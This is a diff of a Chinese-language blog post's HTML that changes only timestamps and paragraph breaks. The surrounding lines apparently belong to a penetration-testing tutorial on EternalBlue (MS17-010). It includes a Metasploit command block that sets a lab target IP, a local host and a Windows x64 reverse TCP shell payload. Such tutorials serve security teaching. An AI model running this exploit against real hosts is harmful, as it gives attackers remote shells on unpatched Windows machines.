@@ -58,7 +58,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/11/19/Gy9fR7brlmSXkWI.png">
 <meta property="og:image" content="https://i.loli.net/2020/11/19/T7GEOnN42ayJHzF.png">
 <meta property="article:published_time" content="2020-11-19T11:38:56.022Z">
-<meta property="article:modified_time" content="2020-11-19T12:23:06.649Z">
+<meta property="article:modified_time" content="2020-11-19T12:27:14.208Z">
 <meta property="article:author" content="Mr.Guo">
 <meta property="article:tag" content="AI">
 <meta name="twitter:card" content="summary">
@@ -316,7 +316,8 @@
             </figure>
 
 <p>配置IP后就可以运行这个模块。</p>
-<p>*<em>192.168.175.134:445  - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)  *</em>发现是永恒之蓝漏洞，下面我们就开始组装exp与payload。</p>
+<p>*<em>192.168.175.134:445  - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)  *</em></p>
+<p>发现是永恒之蓝漏洞，下面我们就开始组装exp与payload。</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tbody><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue //进入exp模块</span><br><span class="line">set RHOSTS 192.168.175.134  //配置目标IP</span><br><span class="line">set Lhost 192.168.175.129  //配置本机IP</span><br><span class="line">set payload windows/x64/shell_reverse_tcp  //payload</span><br></pre></td></tr></tbody></table></figure></div>
 
 <figure class="image-bubble">
@@ -387,7 +388,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2020-11-19T12:23:06.649Z" itemprop="dateUpdated">2020-11-19 20:23:06</time>
+    Last updated: <time datetime="2020-11-19T12:27:14.208Z" itemprop="dateUpdated">2020-11-19 20:27:14</time>
 </span>
 
 
